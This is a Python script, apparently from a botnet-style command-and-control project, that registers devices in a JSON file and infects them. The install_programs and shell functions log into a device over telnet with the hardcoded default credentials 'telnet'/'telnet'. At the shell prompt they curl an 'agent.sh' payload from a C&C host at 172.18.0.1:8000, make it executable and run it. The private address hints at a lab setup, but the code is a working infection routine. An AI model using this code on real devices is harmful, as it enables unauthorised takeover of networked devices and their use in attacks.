import subprocess;
import json;
import asyncio;
import io;
import inspect;
import sys;
import os;
import telnetlib3;

path = os.path.dirname(inspect.stack()[0][1])
CC_HOST = "172.18.0.1"
CC_PORT = "8000"

def add_device(name, ip, alive):
    with open(path + "/../db/devices.json", "r+") as file:
        file_json = json.load(file)
        new_device = {
                "id": len(file_json) + 1,
                "name": name,
                "ip": ip,
                "alive": alive
                }
        file_json.append(new_device)
        file.seek(0)
        json.dump(file_json, file, indent=4)
        file.truncate()

def main():
    add_device("test", "0.0.0.0", False)


# this and the below function install programs have the purpose of
# logging in to the devices and downloading the agent payload to them
async def shell(reader, writer, username, password, dev_id):
    logged_in = False

    while True:
        output = await reader.read(1024)
        if not output:
            break;

        print(output, end='', flush=True)
        if not logged_in:
            if 'login' in output:
                writer.write(username + '\r\n')
            elif 'password' in output or 'Password' in output:
                writer.write(password + '\r\n')

            elif '$' in output:
                logged_in = True
                # TODO: integrated device id management
                writer.write(f"curl http://{CC_HOST}:{CC_PORT}/payload/agent?device_id={dev_id} -o agent.sh\r\n")
        else:
            if "$" in output:
                writer.write(f"echo {dev_id} > dev_id\r\n")
                writer.write(f"chmod +x agent.sh\r\n")
                writer.write(f"./agent.sh\r\n")
                writer.write("exit\r\n")
            

async def install_programs(ip):
    reader, writer = await telnetlib3.client.open_connection(ip, 23);
    await shell(reader, writer, 'telnet', 'telnet', 1);

if __name__ == "__main__":
    if len(sys.argv) > 1:
        asyncio.run(install_programs(sys.argv[1]))
    else:
        main()
